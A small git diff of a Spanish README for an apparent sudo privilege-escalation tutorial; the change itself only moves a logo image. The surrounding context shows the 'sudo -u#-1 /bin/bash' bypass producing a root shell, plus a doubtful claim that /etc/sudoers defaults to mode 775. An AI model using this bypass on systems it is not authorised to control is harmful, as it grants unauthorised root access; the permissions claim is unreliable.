@@ -1,4 +1,4 @@
-<img style="float:left" alt="netspy logo" src="https://github.com/hackingyseguridad/sudo/blob/master/sudo.png">
+# sudo
 
 #0.- Por defecto /etc/sudoers tiene permisos chmod 775. 
 
@@ -45,6 +45,8 @@ $sudo -u#-1 /bin/bash
 root
 
 #8.- ya somos root!
+
+<img style="float:left" alt="netspy logo" src="https://github.com/hackingyseguridad/sudo/blob/master/sudo.png">
 
 exit
 
